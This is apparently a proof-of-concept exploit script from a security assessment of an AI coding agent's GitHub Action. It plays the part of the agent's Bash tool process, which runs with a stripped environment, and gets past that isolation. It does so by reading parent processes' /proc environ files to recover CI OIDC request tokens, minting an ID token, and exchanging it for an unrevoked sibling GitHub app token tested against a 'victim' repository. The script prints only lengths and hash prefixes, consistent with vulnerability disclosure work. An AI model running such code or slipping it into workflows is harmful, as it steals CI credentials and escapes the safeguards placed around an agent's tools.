#!/usr/bin/env bash
# ATT-2 /proc leg child: stands in for the model's Bash tool process, which
# runs with the stripped env (parse-sdk-options.ts:289-290). Attempts to
# recover ACTIONS_ID_TOKEN_REQUEST_* from ancestor /proc/<pid>/environ and, if
# successful, mints a raw OIDC token and exchanges it for a SIBLING app token
# (one the action's revoke step at action.yml:449 would never revoke).
# Marker-only: prints len + sha256:8 only; one read-only GET to prove liveness.
set -u
echo "--- child (stripped env) pid=$$ ppid=$PPID ---"
echo "child env has ACTIONS_ID_TOKEN_REQUEST_TOKEN: $([ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ] && echo YES || echo NO)"

RECOVERED_FROM=""
p=$$
for _ in 1 2 3 4 5 6 7 8; do
  [ -r "/proc/$p/environ" ] || break
  if tr '\0' '\n' < "/proc/$p/environ" 2>/dev/null | grep -q '^ACTIONS_ID_TOKEN_REQUEST_TOKEN='; then
    RECOVERED_FROM="$p"
    break
  fi
  p=$(awk '{print $4}' "/proc/$p/stat" 2>/dev/null || echo 1)
  [ "$p" = "1" ] && break
done

if [ -z "$RECOVERED_FROM" ]; then
  echo "PROC_RECOVERY: FAILED (no ancestor environ contained the vars)"
  exit 0
fi
echo "PROC_RECOVERY: SUCCESS from /proc/$RECOVERED_FROM/environ (sha256_8 of pid environ not shown)"

while IFS= read -r line; do
  case "$line" in
    ACTIONS_ID_TOKEN_REQUEST_URL=*|ACTIONS_ID_TOKEN_REQUEST_TOKEN=*) export "$line" ;;
  esac
done < <(tr '\0' '\n' < "/proc/$RECOVERED_FROM/environ")
echo "recovered REQ_TOKEN len=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN} sha256_8=$(printf '%s' "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | sha256sum | cut -c1-8)"
echo "recovered REQ_URL host: $(printf '%s' "$ACTIONS_ID_TOKEN_REQUEST_URL" | sed 's#\(https\?://[^/]*\).*#\1#')"

python3 - <<'PYEOF'
import os, json, urllib.request, urllib.parse, urllib.error, hashlib, base64

REQ_URL = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
REQ_TOKEN = os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]

def h8(s):
    return hashlib.sha256(s.encode()).hexdigest()[:8]

def get_id_token(aud):
    sep = "&" if "?" in REQ_URL else "?"
    url = REQ_URL + sep + "audience=" + urllib.parse.quote(aud)
    r = urllib.request.Request(url, headers={"Authorization": "Bearer " + REQ_TOKEN})
    with urllib.request.urlopen(r, timeout=30) as resp:
        return json.load(resp)["value"]

idt = get_id_token("claude-code-github-action")
print("SIBLING id-token minted len:", len(idt), "sha256_8:", h8(idt))
p = idt.split(".")[1]; p += "=" * (-len(p) % 4)
c = json.loads(base64.urlsafe_b64decode(p))
print("SIBLING claims subset:", json.dumps({k: c.get(k) for k in
      ("repository", "workflow_ref", "run_id", "aud", "sub", "event_name") if k in c}))

req = urllib.request.Request(
    "https://api.anthropic.com/api/github/github-app-token-exchange",
    data=None,
    headers={"Authorization": "Bearer " + idt, "Accept": "application/json"},
    method="POST")
tok = None
try:
    with urllib.request.urlopen(req, timeout=30) as resp:
        status = resp.status
        data = json.load(resp)
except urllib.error.HTTPError as e:
    status = e.code
    try:
        data = json.loads(e.read().decode())
    except Exception:
        data = {}
if isinstance(data, dict):
    tok = data.get("token") or data.get("app_token")
    d = {k: v for k, v in data.items() if k not in ("token", "app_token")}
    print("SIBLING EXCHANGE ->", status, "token:", ({"present": True, "len": len(tok), "sha256_8": h8(tok)} if tok else None), "body:", json.dumps(d))
else:
    print("SIBLING EXCHANGE ->", status, data)

if tok:
    r = urllib.request.Request(
        "https://api.github.com/repos/N0tre3l/cca-fork-e2e-victim",
        headers={"Authorization": "Bearer " + tok, "Accept": "application/vnd.github+json",
                 "X-GitHub-Api-Version": "2022-11-28"})
    try:
        with urllib.request.urlopen(r, timeout=30) as resp:
            body = resp.read()
            print("SIBLING_TOKEN_LIVENESS GET /repos/N0tre3l/cca-fork-e2e-victim ->",
                  resp.status, "x-oauth-scopes:", repr(resp.headers.get("x-oauth-scopes")), "len:", len(body))
    except urllib.error.HTTPError as e:
        print("SIBLING_TOKEN_LIVENESS ->", e.code)
PYEOF
